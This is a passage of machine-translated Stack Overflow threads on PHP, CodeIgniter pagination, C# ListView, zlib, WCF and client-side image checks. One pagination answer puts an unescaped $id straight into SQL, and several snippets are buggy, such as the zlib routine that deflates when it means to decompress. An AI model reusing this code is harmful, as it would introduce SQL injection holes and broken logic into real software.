WHERE offers.date >= CURDATE() - INTERVAL 1 day 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-11-26T20:18:49.330

基于@edwardmp 的回答，我发现这种语法比使用更易读`DATE_ADD()`：

```
current_date() - interval 1 day 
```

此外，我会使用`IN`而不是`OR`使它更容易与你的 where 子句的其余部分结合起来，而不必过多担心括号：

```
WHERE offers.date in (current_date(), current_date() - interval 1 day) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-06-08T22:45:44.227

它也可能是

```
 offers.date between (current_date() - interval 1 day) and current_date 
```

注意：如果 offer.date 是日期时间值，这将失败，因为 (2017-01-02) < (2017-01-02 12:34:56) 由于 2017-01-02 实际上是 2017-01- 02 00:00:00。

# php - Codeigniter，设置分页

> ID：13572085
> 
> 赞同：0
> 
> 时间：2012-11-26T19:53:42.657
> 
> 标签：php, codeigniter

所以，我在我的网站上设置分页时遇到了问题。

首先，如果我在我网站的第一页，并按下转到第 2 页，“1”仍然保持粗体。虽然我可以在第 2 页的 url 中看到。

其次，我需要一些帮助才能正确检索数据。如果我在第 1 页，我想获取所有记录 1-10。如果我在第 2 页，我想获取 11-20 的所有记录。知道了？

我用谷歌搜索并试图找到任何解决方案，但没有任何成功。

```
$this->db->select('*');
$this->db->from('comments');
$this->db->where('comments.url_friendly', $id);
$this->db->join('allt', 'allt.url_friendly = comments.url_friendly', 'left');
$this->db->order_by('comments.date', 'asc');
$data['query'] = $this->db->get();

$data['title'] = 'Kommentarer - '.$data['query']->row()->amne;

$config['base_url'] = base_url(). 'kommentarer/'.$data['query']->row()->url_friendly;
$config['total_rows'] = $data['query']->num_rows();
$config['per_page'] = 10;

$this->pagination->initialize($config); 

$data['pagination'] = $this->pagination->create_links(); 
```

另外，我在[这个线程](https://stackoverflow.com/questions/7666254/codeigniter-2-0-3-pagination-class-starting-page)中使用帖子 2 中的代码。

是的，如您所见，我是 Codeigniter 的新手。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-27T02:59:27.403

```
$qry = "select * from comment c left join allt a on c.url_friendly = a.url_friendly where c.url_friendly = {$id}";

$per_page = 10;
$offset = ($this->uri->segment(3) != '' ? $this->uri->segment(3):0);//this will get the current page(assuming that page number is in 3rd uri segment). if youy on page one,this will be set to zero

$config['base_url'] = base_url(). 'kommentarer/'.$data['query']->row()->url_friendly;
$config['total_rows'] = $this->db->query($qry)->num_rows();
$config['per_page'] = $per_page;
$config['uri_segment'] = 3; //this is dependent to where your page number displays in url

$this->pagination->initialize($config); 

$qry .= " limit {$per_page} offset {$offset} ";
$data['result'] = $this->db->query($qry)->result();

$data['pagination'] = $this->pagination->create_links(); 
```

希望这会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-27T01:04:42.593

在你做适当的改变后试试这个代码............ codeIgniter 提供了一个内置的分页类。您可以在用户指南中找到它。

在函数中定义一个起始索引变量，您希望在其中使用分页为零。

```
 public function pagination($start_index = 0)
   {

     $result = $this->model->get_results($data); //this $data is the argument which you are passing to your model function. If you are using database to get results array.

     $items_per_page = 10;   //this is constant variable which you need to define

      $filtered_result = array_splice($result, $start_index, ITEM_PER_PAGE_USERS);

     $model['$filtered_result'] = $filtered_result;

     $total_rows = count($result);

     $model['page_links'] = create_page_links (base_url()."/controlelr_name/pagination",ITEM_PER_PAGE_USERS, $total_rows);

     $this->load->view('controller_name/view_file_name', $model);
 }

    function create_page_links($base_url, $per_page, $total_rows) {

      $CI = & get_instance();
      $CI->load->library('pagination');

      $config['base_url'] = $base_url;
      $config['total_rows'] = $total_rows;
      $config['per_page'] = $per_page; 

      $CI->pagination->initialize($config); 

      return $CI->pagination->create_links();
   } 
```

此创建页面链接功能是一个通用功能......更多解释请查看用户指南中的分页类......

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-27T04:18:09.613

```
$query = $this->db->query("SELECT COUNT(*) as jml from comments");
    foreach ($query->result() as $row) {
        $row = $row->jml;
    } // to count all result in your table

    $config['base_url'] = base_url() . 'comments/index/'; // set the base url for pagination
    $config['total_rows'] = $row; // total rows
    $config['per_page'] = '10'; // the number of per page for pagination
    $config['uri_segment'] = 3; // see from base_url. 3 for this case
    $config['first_link'] = 'Awal';
    $config['last_link'] = 'Akhir';
    $config['next_link'] = 'Selanjutnya';
    $config['prev_link'] = 'Sebelumnya';
    $this->pagination->initialize($config);
    $data['comments'] = $this->MArtikel->getAllCommentsPagination($config['per_page'], $this->uri->segment(3));
    // end pagination 
```

# c# - 跟踪 ListView 索引

> ID：13572087
> 
> 赞同：0
> 
> 时间：2012-11-26T19:53:53.413
> 
> 标签：c#, listview

我正在将项目添加到 ListView 中，如下所示：

```
 private int AddThreadToListView(int threadNumber, string proxy, string query, string page, string links)
    {
        int index = 0;
        listView1.SuspendLayout();

        Invoke(new MethodInvoker(
                       delegate
                       {
                           string[] row1 = { proxy, query, page, links };
                           ListViewItem item = new ListViewItem();

                           listView1.Items.Add(threadNumber.ToString()).SubItems.AddRange(row1);
                           index = listView1.Items.Count - 1;
                       }
                       ));

        if ((listView1.Items.Count % 1000) == 0)
        {
            listView1.ResumeLayout();
            listView1.SuspendLayout();
        }

        listView1.ResumeLayout();
        return index;
    } 
```

然后我跟踪项目索引，以便我可以返回并从我的线程中更新它。（效果很好）。

然而问题是当我开始删除这些项目时，由于某些原因索引发生了变化..

这是我的更新和删除方法：

```
 private void UpdateThreadListView(int threadNumber, string proxy, string query, string page, string links)
    {
        Invoke(new MethodInvoker(
                       delegate
                       {
                           listView1.BeginUpdate();

                           ListViewItem itm = listView1.Items[threadNumber];
                           itm.SubItems[1].Text = proxy;

                           itm.SubItems[2].Text = query;
                           itm.SubItems[3].Text = page;
                           itm.SubItems[4].Text = links;                               

                           listView1.EndUpdate();

                       }
                       ));
    }

    private void RemoveThreadListView(int threadNumber)
    {
        Invoke(new MethodInvoker(
                       delegate
                       {
                           listView1.BeginUpdate();
                           listView1.Items[threadNumber].Remove();
                           listView1.EndUpdate();

                       }
                       ));
    } 
```

我不知何故需要一个不变的索引，为每个创建的列表视图项创建一个唯一的索引。

我怎么能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T20:02:56.293

是自动管理的`Index`；它表示给定项目在列表中的位置，因此如果您删除一个项目，所有后续项目的位置都会改变。

您可以使用 的`Tag`属性`ListViewItem`作为键来使用其他条件搜索项目；例如

```
private ListViewItem FindItem(object myTag)
{
    foreach(ListViewItem myItem in listView1.Items)
    {
        if (myItem.Tag.Equals(myTag))
            return myItem;
     }
     return null;
} 
```

`Tag`可以设置为您希望的任何对象；它本质上就是为了这个目的（通过索引以外的方式唯一标识节点）。

请注意，这将比使用索引查找元素效率低，因为它是最坏的情况`O(n)`（与`O(1)`索引相反）。

编辑：

上面的方法只是一个例子，说明如何找到一个给定标签的项目。您可以随时设置标签，但通常您可能希望在创建列表视图项时设置它，例如

```
 Invoke(new MethodInvoker(
                   delegate
                   {
                       string[] row1 = { proxy, query, page, links };
                       ListViewItem item = listView1.Items.Add(threadNumber.ToString());

                       item.SubItems.AddRange(row1);
                       item.Tag = threadNumber.ToString(); // or whatever you want to search by
                       index = listView1.Items.Count - 1;
                   }
                   )); 
```

然后，假设你实现了`FindItem()`我上面给出的例子，你可以这样做：

```
var item = FindItem("3"); // returns the item tagged with "3" 
```

在此示例中，它将返回线程 #3 的项目。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:08:27.130

ListViewItems 的索引更改的事实对于 ListView 来说是正确的行为，因为索引只是它在 UI 控件中的位置。

但是，如果您想跟踪该项目，我不建议您跟踪索引。相反，跟踪 ListViewItem 本身。

现在您可以直接操作 ListViewItem，因为您可以直接引用它。刷新 ListView 后，您应该会看到对该项目所做的任何更改。

这是一个简单的示例，应该可以引导您朝着正确的方向前进。假设我有一个包含 3 行的 ListView，并且我想在删除第二行后更新最后一项。

```
//Grab a reference to the item that I want to update
ListViewItem lvi = this.lvwData.Items[2];

//Remove the second row
this.lvwData.Items.RemoveAt[1];

//Update the ListViewItem
lvi.Text = "Updated";

//Refresh the ListView
this.lvwData.Refresh(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T19:59:24.680

将 int threadNumber 复制到本地 int

```
 private void UpdateThreadListView(int threadNumber, string proxy, string query, string page, string links)
    {
        int index = threadNumber;
        Invoke(new MethodInvoker(
                       delegate
                       {
                           listView1.BeginUpdate();

                           ListViewItem itm = listView1.Items[index];
etc.. 
```

试图找出原因是什么...

# c - 带有 ptrace 的内存调试器

> ID：13572089
> 
> 赞同：0
> 
> 时间：2012-11-26T19:53:57.293
> 
> 标签：c, linux, memory-leaks, ptrace

我想使用内存调试器的功能（只是泄漏检测）扩展现有工具。

我知道一些内存调试器通过替换 malloc/free 并跟踪待释放的内容以及分配它的人来工作；或者通过在某种虚拟机上运行进程并监视内存访问。

我想知道使用`ptrace()`在 malloc/free 上设置断点是否有意义，而不是使用*dmalloc*进行重建，并在单独的进程中监视分配。会不会太慢？有其他工具以这种方式工作吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-04-19T02:55:19.787

由于以下几个原因，使用调试器和捕获 malloc/free 调用是不切实际的：

1.  从一个进程切换到另一个进程的开销对于非平凡的程序来说是巨大的。

2.  与使用其他方法相比，您最终将花费相似数量的内存来存储所有权信息。（这是我真正想要改进的）

3.  有很多函数可以在堆上工作，很容易错过一些。

# php - php：将任意html元素的数据存储在html中以将此数据传递给HTML页面上元素的innerHTML的最佳方法？

> ID：13572090
> 
> 赞同：1
> 
> 时间：2012-11-26T19:54:00.933
> 
> 标签：php, javascript, html

例如我在 php 中有这样的字符串：

```
$str='<img title="title of image" src="../somepic.gif" alt="some pic image" class="someclass" style="somestiles" onload="alert(this)" />';
//it can be anything: '<br>123<P><script>' or '123</script>' (even with newlines \r and \n and other special symbols) 
```

我需要它只在点击后显示：

```
<?php 
echo'<div>
  <textarea onclick="this.parentNode.innerHTML=this.value">',htmlspecialchars($str),'</textarea>
</div>'; 
?> 
```

正如我们所看到的，js 将 texarea 元素替换为存储在 $str 变量中并作为文本放置在“<textarea>”值中的内容。

我需要知道如何在**不使用 textarea 元素**为 JS 存储数据的情况下实现这一点。（现在我正在使用隐藏的文本区域，但我怀疑这种方法是否正确）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:09:03.573

只需将 HTML 存储为（正确转义的）字符串：

```
var foo = document.getElementById("foo"),
    html = "<img src='http://placekitten.com/100/100' onclick='alert(1);' />";

if (foo.addEventListener) {
    foo.addEventListener("click", setInner, false);
} else if(foo.attachEvent) {
    foo.attachEvent("onclick", setInner);
}

function setInner () {
    foo.innerHTML = html;
}​ 
```

演示：http: [//jsfiddle.net/UAL8P/](http://jsfiddle.net/UAL8P/)

# performance - SSRS 在检索 sql 结果时是否使用压缩？

> ID：13572097
> 
> 赞同：0
> 
> 时间：2012-11-26T19:54:28.650
> 
> 标签：performance, sql-server-2008, reporting-services

当 Reporting Services 运行报表查询并检索结果集时，数据结果是否以某种方式压缩以限制数据大小？举个极端的例子，如果结果集中的所有 100,000 条记录中有一列（多列中的一列）具有相同的值，SSRS 是否知道只带回一个值以节省通过网络发送过多的数据？

我指的是数据检索阶段，而不是处理/渲染之后。

SSRS 2008 / 2012

# php - 什么定义了 PHP 中的超时时间？

> ID：13572099
> 
> 赞同：0
> 
> 时间：2012-11-26T19:54:41.090
> 
> 标签：php, apache, timeout

说，我在 Apache 上运行 PHP。当有人发出客户端请求时（不管如何），什么定义了客户端将等待的时间量，脚本运行？**这个选项是 Apache 的、PHP 的还是由客户自己定义的？** 另外，如果脚本是通过 curl 调用的呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T19:56:07.413

见 PHP[`set_time_limit()`](http://php.net/manual/en/function.set-time-limit.php)

> 设置允许脚本运行的秒数。如果达到此值，脚本将返回致命错误。默认限制为 30 秒，如果存在，则为 php.ini 中定义的**max_execution_time**值。

请注意：

> 当 PHP 在安全模式下运行时，此功能无效。除了关闭安全模式或更改 php.ini 中的时间限制之外，没有其他解决方法。

您可能还对**max_input_time**感兴趣（通过 php.ini 设置）

> 这设置了允许脚本解析输入数据（如 POST 和 GET）的最长时间（以秒为单位）。它是从接收服务器上的所有数据到开始执行脚本的那一刻测量的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T19:57:05.427

它在 中定义`php.ini`，参数被调用`max_execution_time`。

您可以使用 [`set_time_limit`](http://php.net/manual/en/function.set-time-limit.php),[`ini_set`](http://php.net/manual/en/function.ini-set.php)或[`php.ini`](http://php.net/manual/en/ini.php)直接更改它。

但是，实际上你在问

> 客户端将等待的时间，要运行的脚本

恕我直言，它是无限的。我从未见过这样的时刻，服务器正在运行脚本并且浏览器拒绝等待。主要是保持脚本在服务器上运行。

# jquery - 带有掩码输入的jquery罗马数字

> ID：13572104
> 
> 赞同：0
> 
> 时间：2012-11-26T19:55:34.990
> 
> 标签：jquery, maskedinput

帮助我使用罗马数字的屏蔽输入掩码。我需要创建一个掩码，我只能输入从 I 到 X 的罗马数字

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T20:10:12.477

如果您不使用插件，最简单的方法是编写一个正则表达式并匹配一个输入值。[如果在这里](https://stackoverflow.com/questions/267399/how-do-you-match-only-valid-roman-numerals-with-a-regular-expression)找到一个非常好的

```
$(function(){
    var strInput = $('input#myRomanInputField').val();
    var matchArr = strInput.match(/^M{0,4}(CM|CD|D?C{0,3})(XC|XL|L?X{0,3})(IX|IV|V?I{0,3})$/g);
    console.log(matchArr);
    if(matchArr) {
        // test successful
        console.log("true");
    } else {
        // failure
        console.log("false");
    }
}); 
```

对于数字 1-10，只需使用此正则表达式：

```
/^(IX|IV|V?I{0,3})$|^X$/g 
```

# .net - 创建第三方实现的 WCF 服务

> ID：13572115
> 
> 赞同：0
> 
> 时间：2012-11-26T19:56:08.240
> 
> 标签：.net, wcf, web-services

我需要为将由我的公司托管但将由第三方实施的 Web 服务创建 Web 服务 API 和数据合同。最好的方法是什么？

理想情况下，我不想要求第三方必须使用 .NET 或任何特定技术。我只想给他们操作和数据合同。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-26T20:19:06.240

**如果**您的第三方**使用 .NET** - 那么最简单的解决方案就是简单地将合同定义为 C# 或 VB.NET 中的接口 -**服务合同**、**操作合同**（服务方法）、**数据合同**（传回的类型）等等） - 但将实施留给第三方。

基本上，您可以将所有这些内容放入一个单独的类库程序集中，然后将该程序集作为您的 API 定义发送。然后，该第三方可以将**服务实现实现**为 C#/VB.NET 类库，并将其发回给您。

**如果**您的第三方**根本不使用 .NET**，那么您必须创建一个描述服务及其方法的**WSDL （Web 服务描述语言）文档，以及一些描述正在发送的数据类型的****XSD**（XML 模式）文件来回。

您可以通过基本上执行与上述相同的步骤来相当容易地做到这一点 - 创建您的服务、操作和数据合同 - 然后自己实现该服务的“虚拟”实现；然后启动该服务并从该正在运行的服务创建 WSDL / XSD。将这些文档发送给您的第三方，让他们自行实施服务。

或者当然 - 您也可以从头开始手动编写 WSDL/XSD - 但这与 a) 黑人艺术和 b) 受虐狂有关 - 不推荐......

# php - PHP - 连接 if 语句？

> ID：13572117
> 
> 赞同：7
> 
> 时间：2012-11-26T19:56:08.287
> 
> 标签：php, if-statement, concatenation

我想在回声中间连接写一个 if 语句，这可能吗？这就是我所拥有的。

```
echo "<li class='".if ($_GET["p"] == "home") { echo "active"; }."'><a href='#'>Home</a>        </li>"; 
```

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-11-26T19:58:09.030

像这样，使用[三元运算符](http://en.wikipedia.org/wiki/%3F:)：

```
echo "<li class='". (($_GET["p"] == "home") ? "active" : "") . "'><a href='#'>Home</a>        </li>"; 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-26T19:58:11.667

```
echo "<li class='".(($_GET["p"] == "home") ? "active" : "")."'><a href='#'>Home</a>        </li>"; 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-26T19:58:06.990

这样做：

```
echo "<li class='".($_GET["p"] == "home" ? 'active' : '') ."'><a href='#'>Home</a>        </li>"; 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-11-26T20:16:04.803

我可以建议不要使用凌乱的内联串联，而是要舒适[`printf()`](http://ca1.php.net/manual/en/function.printf.php)吗？

```
$format = '<li class="%s"><a href="#">Home</a>        </li>';
printf($format, ($_GET['p'] == 'home') ? 'active' : ''); 
```

# android - 为 iOS 和 Android 应用程序后端托管 WCF 服务

> ID：13572121
> 
> 赞同：-1
> 
> 时间：2012-11-26T19:56:19.437
> 
> 标签：android, .net, ios, wcf, hosting

我想为我的服务器端创建一个 WCF 服务，供多个平台（iOS 和 Android）进行操作（主要是发送文本和图像等数据）。我有几个问题：

*   WCF Soap 或 MVC3 WCF 是否适合完成此任务？我相信它应该因为我基本上只是发布数据。
*   WCF 能否在传输数据时保持数据安全？
*   我需要什么类型的托管帐户？我目前有一个个人网站的 hostgator 帐户，但我猜我可能需要一个“VPS”或虚拟主机帐户，让我可以完全控制 IIS 以指向 WCF 端点？我对最后一项不太清楚。

谢谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T21:18:55.233

JSON 是你的朋友。

在服务web.config中，关键点是：

```
 <behaviors>
      <endpointBehaviors>
        <behavior name="webHttpBehavior">
          <webHttp />
        </behavior>
      </endpointBehaviors>
    </behaviors> 
```

和

```
 <system.webServer>
    <modules runAllManagedModulesForAllRequests="true"/>
  </system.webServer> 
```

在您的 .svc 文件中使用：

```
Factory="System.ServiceModel.Activation.WebServiceHostFactory" 
```

最后，在服务代码中，我推荐[http://json.codeplex.com/](http://json.codeplex.com/)而不是 MS 内置的 JSON 序列化程序。

# java - 正则表达式记事本++

> ID：13572127
> 
> 赞同：2
> 
> 时间：2012-11-26T19:56:40.823
> 
> 标签：java, regex, string, notepad++

我有一个带有链接的大文件：

```
http://livetv.ru/en/livescore/
http://www.premiocentre.ru/
http://cs.rin.ru/forum/
http://www.girlsgames123.ru/zomer.html
http://wikitourist.ru/Prescott,_ARIZONA_Virginia_homes_tutorial_Made_for_All_Purchaser9851840
http://spanishrestaurant.ru/tags/%F0%FB%E1%E0/ 
```

如何为记事本++编写一个正则表达式以删除第三个 / 之后的所有内容？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-26T20:04:25.880

搜索

```
^((?:[^\/]*\/){3}).*$ 
```

并将其替换为

```
$1 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:05:06.553

我可能误解了，因为您的示例都没有超过三个斜线。但这里有：

搜索：

```
(http://[^/]+/[^/]+/[^/]+/).* 
```

用。。。来代替：

```
\1 
```

如果您将 http:// 计为前两个斜杠，那么您想使用此正则表达式：

```
(http://[^/]+/).* 
```

# javascript - 是否可以在上传之前检查图像的尺寸？

> ID：13572129
> 
> 赞同：67
> 
> 时间：2012-11-26T19:56:49.963
> 
> 标签：javascript, jquery, file-upload, client-side

我有一个用于将图像上传到服务器的上传控件，但在上传之前我只想确保图像的尺寸是否正确。客户端有什么可以用 JavaScript 完成的吗？

* * *

## 回答 #1

> 赞同：74
> 
> 时间：2012-11-26T20:03:33.993

您可以在提交表单之前检查它们：

```
window.URL = window.URL || window.webkitURL;

$("form").submit( function( e ) {
    var form = this;
    e.preventDefault(); //Stop the submit for now
                                //Replace with your selector to find the file input in your form
    var fileInput = $(this).find("input[type=file]")[0],
        file = fileInput.files && fileInput.files[0];

    if( file ) {
        var img = new Image();

        img.src = window.URL.createObjectURL( file );

        img.onload = function() {
            var width = img.naturalWidth,
                height = img.naturalHeight;

            window.URL.revokeObjectURL( img.src );

            if( width == 400 && height == 300 ) {
                form.submit();
            }
            else {
                //fail
            }
        };
    }
    else { //No file was input or browser doesn't support client side reading
        form.submit();
    }

}); 
```

这仅适用于现代浏览器，因此您仍然需要检查服务器端的尺寸。您也不能信任客户端，因此这是您必须在服务器端检查它们的另一个原因。

* * *

## 回答 #2

> 赞同：47
> 
> 时间：2012-11-26T20:01:50.640

是的，HTML5 API 支持这一点。

[http://www.w3.org/TR/FileAPI/](http://www.w3.org/TR/FileAPI/)

```
var _URL = window.URL || window.webkitURL;

$("#file").change(function(e) {

    var image, file;

    if ((file = this.files[0])) {

        image = new Image();

        image.onload = function() {

            alert("The image width is " +this.width + " and image height is " + this.height);
        };

        image.src = _URL.createObjectURL(file);

    }

});​ 
```

[演示](http://jsfiddle.net/xnkhN/)（在 chrome 上测试）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2019-06-13T14:27:42.040

可能有点晚了，但这是使用承诺的接受答案的现代 ES6 版本

```
const getUploadedFileDimensions: file => new Promise((resolve, reject) => {
    try {
        let img = new Image()

        img.onload = () => {
            const width  = img.naturalWidth,
                  height = img.naturalHeight

            window.URL.revokeObjectURL(img.src)

            return resolve({width, height})
        }

        img.src = window.URL.createObjectURL(file)
    } catch (exception) {
        return reject(exception)
    }
}) 
```

你会这样称呼它

```
getUploadedFileDimensions(file).then(({width, height}) => {
    console.log(width, height)
}) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-04-03T11:18:34.233

为简单起见，请使用 javascript 图像处理框架，如[fabric.js](http://fabricjs.com/)、[processing.js](http://processingjs.org/)和[MarvinJ](https://www.marvinj.org)。

在[MarvinJ](https://www,marvinj.org)的情况下，只需在客户端加载图像并使用方法**getWidth()**和**getHeight()**来检查图像的尺寸。拥有这些维度，您可以允许文件提交或通知用户有关不兼容的维度。

**例子：**

```
var image = new MarvinImage();
image.load("https://i.imgur.com/oOZmCas.jpg", imageLoaded);

function imageLoaded(){
  document.getElementById("result").innerHTML += image.getWidth()+","+image.getHeight();
}
```

```
<script src="https://www.marvinj.org/releases/marvinj-0.8.js"></script>
<div id="result"></div>
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2019-08-07T03:15:19.420

如果您不需要处理 svg 文件并且可以限制自己使用[最新的浏览器](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/createImageBitmap#Browser_compatibility)，那么您可以使用该[`createImageBitmap`](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/createImageBitmap)功能来制作基于 Promise 的单行：

```
if(typeof createImageBitmap !== "function") {
  console.error("Your browser doesn't support this method");
  // fallback to URL.createObjectURL + <img>
}

inp.oninput = e => {
  createImageBitmap(inp.files[0])
    .then((bmp) => console.log(bmp.width, bmp.height))
    .catch(console.error);
}
```

```
<input type="file" id="inp" accept="image/*">
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2020-06-01T19:29:46.033

[@Klemen Tusar](https://stackoverflow.com/a/56582753/3819990)对多个文件的分析器的扩展：

```
const loadImage = file => new Promise((resolve, reject) => {
    try {
        const image = new Image();

        image.onload = function () {
            resolve(this)
        };

        image.onerror = function () {
            reject("Invalid image. Please select an image file.");
        }

        image.src = window.URL.createObjectURL(file);
    } catch (e) {
        reject(e)
    }
})

const loadImagesArray = async files => {
    let images = Array(files.length)
    await Promise.all(files.map((file, i) => (async () => {
        const loadedImage = await loadImage(file)
        images[i] = loadedImage
    })()))
    return images
} 
```

然后你可以简单地检查加载图像的内容，如下所示：

```
const loadedImages = await loadImagesArray(e.currentTarget.files)
for(const loadedImage of loadedImages) {
    console.log(loadedImage.width, loadedImage.height)
} 
```

* * *

## 回答 #7

> 赞同：-3
> 
> 时间：2012-11-26T20:01:15.193

试一试。我过去用过这个。 [https://github.com/valums/file-uploader](https://github.com/valums/file-uploader)

# xcode - 带有 Google 日历的 MBProgress HUD

> ID：13572130
> 
> 赞同：1
> 
> 时间：2012-11-26T19:56:51.827
> 
> 标签：xcode, calendar, hud

大家好，我正试图在我的应用程序下载谷歌日历活动期间显示 mbprogress，但我有一个问题......如果我添加 mbprogress，我无法下载活动......

这是我的代码：

```
 - (void)viewDidLoad
{
    [super viewDidLoad];

   self.navigationItem.hidesBackButton = YES;

MBProgressHUD *HUD = [MBProgressHUD showHUDAddedTo:self.navigationController.view animated:YES];
    [self.navigationController.view addSubview:HUD];
    tabella.hidden=YES;

    HUD.delegate = self;
    HUD.labelText = @"Attendere prego...";
    HUD.square = NO;
    HUD.userInteractionEnabled=NO;
    [HUD showWhileExecuting:@selector(myTask:) onTarget:self withObject:nil animated:YES];

}

- (void)myTask:(id)selector{
    data = [[NSMutableArray alloc] init];
    googleCalendarService = [[GDataServiceGoogleCalendar alloc] init];

    [googleCalendarService setUserAgent:@"xxxxx"];
    [googleCalendarService setUserCredentialsWithUsername:@"xxxxxx"
                                                 password:@"yyyyy"];

    [self refresh];

}

- (void)refresh{

    [data removeAllObjects];
   [googleCalendarService fetchCalendarFeedForUsername:@"xxxxx"
                                               delegate:self
                                      didFinishSelector:@selector( calendarsTicket:finishedWithFeed:error: )];

} 
```

问题是应用程序不去 calendarsTicket void

# c++ - 在释放模式下检测到缓冲区溢出 - linux

> ID：13572144
> 
> 赞同：3
> 
> 时间：2012-11-26T19:57:53.163
> 
> 标签：c++, linux, zlib, buffer-overflow, libc

好的..我已经制作了一个使用 zlib 解压缩字符串的系统...我认为它可以工作，但是我的 base64 转换器有问题，所以我不能确定数据是否正确...它适用于一个非常小的字符串，即“帮助”，但这个字符串会导致缓冲区溢出“eJxjZMAOmHCIM+MQZ8EhzgrEAAKAABA=”

```
this is the function in question!

#include <zlib.h>
#include <stdlib.h>
#include <string.h>
#include "../../inc/tools/Zunz.h"

using namespace tool;

static const int maxUncompressedSize = 4096;

std::string Zunz::UnZip(std::string const& s)
{
    char *cmprsd;
    char uncompressed[maxUncompressedSize];
    int sizeOfS = sizeof(s);
    cmprsd = (char*) malloc(sizeOfS);
    strcpy(cmprsd, s.c_str());

    // deflate
    // zlib struct
    z_stream defstream;
    defstream.zalloc = Z_NULL;
    defstream.zfree = Z_NULL;
    defstream.opaque = Z_NULL;
    defstream.avail_in = (uInt)strlen(cmprsd)+1; // size of input, string + terminator
    defstream.next_in = (Bytef *)cmprsd; // input char array
    defstream.avail_out = (uInt)sizeof(uncompressed); // size of output
    defstream.next_out = (Bytef *)uncompressed; // output char array

    deflateInit(&defstream, Z_DEFAULT_COMPRESSION);
    deflate(&defstream, Z_FINISH);
    deflateEnd(&defstream);

    return(std::string(uncompressed));
} 
```

这段代码在调试中工作正常，但在发布时导致缓冲区溢出。我认为可能导致这种情况的唯一两件事是 1\. zlib 的不正确使用（我对它很陌生）或 2\. 我遵循了这个指南： http: [//www.devside.net/guides/linux/zlib](http://www.devside.net/guides/linux/zlib)

这是输出：

```
 *** buffer overflow detected ***: ./sfml tests terminated
    ======= Backtrace: =========
    /lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x5c)[0x7f6b81c2182c]
    /lib/x86_64-linux-gnu/libc.so.6(+0x109700)[0x7f6b81c20700]
    ./sfml tests[0x4075d2]
    ./sfml tests[0x406e2a]
    ./sfml tests[0x406865]
    ./sfml tests[0x406339]
    /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xed)[0x7f6b81b3876d]
    ./sfml tests[0x406771]
    ======= Memory map: ========
    00400000-0043a000 r-xp 00000000 08:01 788443                             /home/falconmick/sfml tests/bin/Release/sfml tests
    00639000-0063a000 r--p 00039000 08:01 788443                             /home/falconmick/sfml tests/bin/Release/sfml tests
    0063a000-0063b000 rw-p 0003a000 08:01 788443                             /home/falconmick/sfml tests/bin/Release/sfml tests
    0063b000-0063d000 rw-p 00000000 00:00 0 
    01382000-013a3000 rw-p 00000000 00:00 0                                  [heap]
    7f6b7fe6d000-7f6b7fe72000 r-xp 00000000 08:01 6007                       /usr/lib/x86_64-linux-gnu/libXdmcp.so.6.0.0
    7f6b7fe72000-7f6b80071000 ---p 00005000 08:01 6007                       /usr/lib/x86_64-linux-gnu/libXdmcp.so.6.0.0
    7f6b80071000-7f6b80072000 r--p 00004000 08:01 6007                       /usr/lib/x86_64-linux-gnu/libXdmcp.so.6.0.0
    7f6b80072000-7f6b80073000 rw-p 00005000 08:01 6007                       /usr/lib/x86_64-linux-gnu/libXdmcp.so.6.0.0
    7f6b80073000-7f6b80075000 r-xp 00000000 08:01 5996                       /usr/lib/x86_64-linux-gnu/libXau.so.6.0.0
    7f6b80075000-7f6b80275000 ---p 00002000 08:01 5996                       /usr/lib/x86_64-linux-gnu/libXau.so.6.0.0
    7f6b80275000-7f6b80276000 r--p 00002000 08:01 5996                       /usr/lib/x86_64-linux-gnu/libXau.so.6.0.0
    7f6b80276000-7f6b80277000 rw-p 00003000 08:01 5996                       /usr/lib/x86_64-linux-gnu/libXau.so.6.0.0
    7f6b80277000-7f6b80280000 r-xp 00000000 08:01 6029                       /usr/lib/x86_64-linux-gnu/libXrender.so.1.3.0
    7f6b80280000-7f6b8047f000 ---p 00009000 08:01 6029                       /usr/lib/x86_64-linux-gnu/libXrender.so.1.3.0
    7f6b8047f000-7f6b80480000 r--p 00008000 08:01 6029                       /usr/lib/x86_64-linux-gnu/libXrender.so.1.3.0
    7f6b80480000-7f6b80481000 rw-p 00009000 08:01 6029                       /usr/lib/x86_64-linux-gnu/libXrender.so.1.3.0
    7f6b80481000-7f6b80483000 r-xp 00000000 08:01 921657                     /lib/x86_64-linux-gnu/libdl-2.15.so
    7f6b80483000-7f6b80683000 ---p 00002000 08:01 921657                     /lib/x86_64-linux-gnu/libdl-2.15.so
    7f6b80683000-7f6b80684000 r--p 00002000 08:01 921657                     /lib/x86_64-linux-gnu/libdl-2.15.so
    7f6b80684000-7f6b80685000 rw-p 00003000 08:01 921657                     /lib/x86_64-linux-gnu/libdl-2.15.so
